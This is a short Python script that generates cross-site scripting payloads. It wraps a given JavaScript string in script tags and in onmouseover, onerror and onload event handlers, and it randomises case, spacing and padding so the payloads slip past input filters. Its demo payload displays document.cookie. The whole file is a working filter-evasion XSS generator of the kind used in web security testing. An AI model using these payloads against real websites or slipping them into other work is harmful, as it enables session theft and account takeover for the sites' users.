import random
def randomurl():
    chars='abcdefghijklmnopqrstuvwxyz'
    length=random.randint(5, 20)
    choice=random.choice
    return ''.join(choice(chars) for i in range(length))+'.com'
    
def xssencode(javascript):
    #javascript='eval(String.fromCharCode(%s))' % ','.join(str(ord(i)) for i in javascript)
    options=['<script>{}</script>',
             '<a onmouseover="{}">%s</a>' % (' '*random.randint(0, 500)),
             '<dev onmouseover="{}">%s</dev>' % (' '*random.randint(0, 500)),
             '<span onmouseover="{}">%s</span>' % (' '*random.randint(0, 500)),
             '<img onmouseover="{}" src="#"/>',
             '<img onmouseover="{}"/>',
             '<img onerror="{}" src="/"/>',
             '<img onerror="{}" src="%s"/>' % randomurl(),
             '<iframe onmouseover="{}" src="#"></iframe>',
             '<body onload={}>',]
    for i in options:
        i=''.join(a.upper() if random.randint(0,1) else a.lower() for a in i)
        i=''.join(a if random.randint(0,1) or a!='>' else ' >' for a in i)
        i=''.join(a if random.randint(0,1) or a!=' ' else '  ' for a in i)
        yield i.format(javascript)
if __name__=='__main__':
    attack="alert('XSS: '+document.cookie)"
    print('\n'.join(xssencode(attack)))
